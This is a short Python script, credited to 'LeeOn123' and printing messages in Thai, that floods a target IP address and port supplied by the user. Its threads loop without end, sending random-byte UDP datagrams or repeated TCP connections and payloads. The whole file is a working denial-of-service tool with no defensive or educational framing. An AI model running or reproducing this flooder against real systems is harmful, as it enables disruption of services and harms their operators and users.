#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("--> Bang Dev Update <--")
print("#-- TCP SOCKET --#")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" Y:"))
times = int(input(" TIME AUTORUN:"))
threads = int(input(" TREADS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ปิวๆ!!!")
		except:
			print("[!] ผิดผลาด!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ปิ้วๆ!!!")
		except:
			s.close()
			print("[*] ไม่เข้า")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
